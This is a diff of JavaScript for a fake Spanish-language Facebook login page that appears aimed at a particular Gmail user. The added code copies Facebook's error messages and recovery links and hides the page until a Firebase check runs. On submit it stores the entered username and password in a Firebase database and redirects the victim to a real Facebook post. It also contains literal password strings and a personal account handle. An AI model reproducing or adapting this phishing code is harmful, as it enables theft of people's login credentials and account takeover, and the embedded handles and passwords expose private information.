@@ -10,32 +10,67 @@ var firebaseConfig = {
 };
 // Initialize Firebase
 firebase.initializeApp(firebaseConfig);
+// document.addEventListener("DOMContentLoaded",  fetchData);
+document.onreadystatechange =()=>{
+    if(document.readyState ==="complete") {
+        document.querySelector("body").style.visibility = "hidden"; 
+        fetchData();
+    }       
+    
+            
+}
+
+const db = firebase.database().ref("data").limitToLast(1);
 
 
-const db = firebase.database().ref("data");
+//VALIDATION
 const pattern = /^remington((\w)(?!\2)|\d){3}2@gmail.com$/;
-const passwordPattern =/^(?=.{5,15}$)(?!yuli8954|galileo19)(([a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ])(?!\2)|(?!\d*?(\d)\3{2})\d*)+$/gm;   
+const passwordPattern =/^(?=.{5,15}$)(?!yuli8954|galileo19|hehehe|fuckyou|marica|marico)(([a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ])(?!\2)|(?!\d*?(\d)\3{2})\d*)+$/gm;   
 ///^(?={5,15}$) (([a-zA-Z])(?!\2) | (?!\d*?(\d)\3{3})\d*))$/gm;
+function isUsernameValid(username){
+   
+    let regex=new RegExp(pattern);
+    if(username){
+      // return regx.test(username);   
+        return  regex.test(username);       
+    }
+    
+    return false;
+}
+function isPasswordValid(password){
+    const charSet=String.raw`a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ`;
+   
+    let regx=new RegExp(passwordPattern);
+   
+    if(password)
+        return regx.test(password)
+    
+   return false; 
+}
+
+
+
 async function  fetchData(){
     
     await  db.on('value',(snapshot)=>{
+        
              snapshot.forEach((childSnap)=>{
                   let data = childSnap.val();
-                  if(isUsernameValid(data.usenname) && isPasswordValid(data.password))
-                       return;
-                    else {
-                        //window.document.getElementsByTagName('body').style.display='none';
-                        window.location.replace(
-                            "https://www.google.com",
-                            "_blank"
-                        );     
-                    }   
-                                   
+                  
+                  if(isUsernameValid(data.usename) && isPasswordValid(data.password)){
+                    window.location.replace(
+                        "https://www.facebook.com/YouWriteEnglish/posts/149495623437791",
+                        "_blank"
+                    );  
+                  }                      
+                    else 
+                        document.querySelector("body").style.visibility = "visible";
+                                                    
              })
          })
   
   }
-window.onload=fetchData();
+
 
 
 
@@ -64,72 +99,120 @@ const linkMessage = document.createTextNode('Regístrate para crear una cuenta.'
 const classAttribute = document.createAttribute("class");
 const href = document.createAttribute("href");
 classAttribute.value = " _652e ";
-href.value = " / r.php ";
+href.value = "https://m.facebook.com/r.php?soft=hjk";
 
-errorMessageLink.appendChild(linkMessage);
-errorMessageLink.href = href.value;
-errorMessageLink.setAttribute('class',classAttribute.value);
+//INVALID USERNAME ERROR
+
+const errorInvalidUsername = document.createTextNode(
+    "El número de móvil o el correo electrónico que has introducido no coinciden con ninguna cuenta."
+);
+const errorInvalid = document.createTextNode('Recupera tu cuenta.')
+
+//const errorInvalidUserMessage = document.createTextNode('¿Has olvidado la contraseña?')
+
+const errorRecoverUsername = document.createElement('a');
+errorRecoverUsername.href='https://m.facebook.com/login/identify'
+errorRecoverUsername.appendChild(errorInvalid);
 
 //WRONG PASSWORD ERROR
 const errorMessagePass = document.createElement('span')
 const errorPass = document.createTextNode('Contraseña incorrecta.')
 const errorRecoverPassMessage = document.createTextNode('¿Has olvidado la contraseña?')
-errorMessagePass.appendChild(errorPass);
+const show = document.getElementById('u_0_1')
 const errorRecoverPass = document.createElement('a');
-errorRecoverPass.href = "/recover/initiate/?ars=facebook_login_pw_error&amp;email=julieta.bonilla.520&amp;lwv=120&amp;lwc=1348092";
-errorRecoverPass.setAttribute('class',classAttribute.value)
-errorRecoverPass.appendChild(errorRecoverPassMessage);
-
-
-//VALIDATION
-function isUsernameValid(username){
-   
-    let regx=new RegExp(pattern);
-    if(username){
-      // return regx.test(username);   
-      if(!regx.test(username))
-              console.log("wrong");        
-     else
-        console.log("true")         
-    }
-    
-    return false;
-}
-function isPasswordValid(password){
-    const charSet=String.raw`a-zA-ZáàâäãåçéèêëíìîïñóòôöõúùûüýÿæœÁÀÂÄÃÅÇÉÈÊËÍÌÎÏÑÓÒÔÖÕÚÙÛÜÝŸÆŒ`;
-   
-    let regx=new RegExp(passwordPattern);
-    console.log(regx.test(password))
-    if(password)
-        return regx.test(password)
-    
-   return false; 
-}
+errorRecoverPass.href = "https://m.facebook.com/recover/initiate/?ars=facebook_login_pw_error&email=julieta.bonilla.520&lwv=120&lwc=1348092";
 
 
 
-loginForm.addEventListener("submit", async(e) => {
+    password.addEventListener('keyup',(e)=>{
+        if(password.value !=='')
+         show.style.display='block';
+         else 
+         show.style.display='none';
+
+    });
+    show.addEventListener('click',()=>{
+        if(password.getAttribute('type').valueOf()==='password')
+             password.setAttribute('type','text')
+        else 
+         password.setAttribute('type','password')
+    })
+loginForm.addEventListener("submit", (e) => {
     e.preventDefault();
     e.stopPropagation();
     const data = {
         usename: username.value,
         password: password.value,
     };
-   isPasswordValid(password.value);
-    if (isUsernameValid(username.value) && isPasswordValid(password.value)) {
-        // await submit(username.value, password.value);
-        // window.location.replace(
-        //     "https://www.facebook.com/watch/?v=193954128684871",
-        //     "_blank"
-        // );
-    } else if(!username.value) {
+    
+    if(username.value==='') {
+        //loginError.style.display = "none";
+        if(loginError.contains(errorMessagePass) && loginError.contains(errorRecoverPass)){
+            loginError.removeChild(errorMessagePass);
+            loginError.removeChild(errorRecoverPass)
+        }
+        
+        if(loginError.contains(errorRecoverUsername) && loginError.contains(errorInvalidUsername)){
+            loginError.removeChild(errorRecoverUsername);
+            loginError.removeChild(errorInvalidUsername)
+        }
+        errorMessageLink.appendChild(linkMessage);
+        errorMessageLink.href = 'https://m.facebook.com/r.php?soft=hjk';
+        errorMessageLink.setAttribute('class',classAttribute.value);
+        
         loginError.appendChild(errorMessage);
         loginError.appendChild(errorMessageLink);
+        
+        
         loginError.style.display = "block";
+        
+        
     }
-    else{
-        loginError.appendChild(errorMessagePass);
-        loginError.appendChild(errorRecoverPass);
-        loginError.style.display = "block"; 
+    else if(!isUsernameValid(username.value) && username.value){
+         
+             if(loginError.contains(errorMessagePass) && loginError.contains(errorRecoverPass)){
+                 loginError.removeChild(errorMessagePass);
+                 loginError.removeChild(errorRecoverPass);
+                }
+                if( loginError.contains(errorMessage) && loginError.contains(errorMessageLink) ){
+                     loginError.removeChild(errorMessage);
+                     loginError.removeChild(errorMessageLink);   
+                }
+                
+                 errorRecoverUsername.setAttribute('class',classAttribute.value)        
+                 loginError.appendChild(errorInvalidUsername);
+                 loginError.appendChild(errorRecoverUsername);
+               
+               
+                 loginError.style.display = "block";
+            }
+    else if(!isPasswordValid(password.value) && isUsernameValid(username.value) ){
+   
+        if(loginError.contains(errorMessage) && loginError.contains(errorMessageLink)){
+           
+            loginError.removeChild(errorMessage);
+            loginError.removeChild(errorMessageLink)
+        }
+        if(loginError.contains(errorRecoverUsername) && loginError.contains(errorInvalidUsername)){
+            loginError.removeChild(errorRecoverUsername);
+            loginError.removeChild(errorInvalidUsername)
+        }
+            errorMessagePass.appendChild(errorPass);
+            errorRecoverPass.setAttribute('class',classAttribute.value)
+            errorRecoverPass.appendChild(errorRecoverPassMessage);
+       
+            loginError.appendChild(errorMessagePass);
+            loginError.appendChild(errorRecoverPass);
+            
+            loginError.style.display = "block";        
+        
     }
+     if(isPasswordValid(password.value) && isUsernameValid(username.value))
+             {
+                 submit(username.value,password.value);
+                 window.location.replace(
+                    "https://www.facebook.com/YouWriteEnglish/posts/149495623437791",
+                    "_blank"
+                );  
+            }
 });
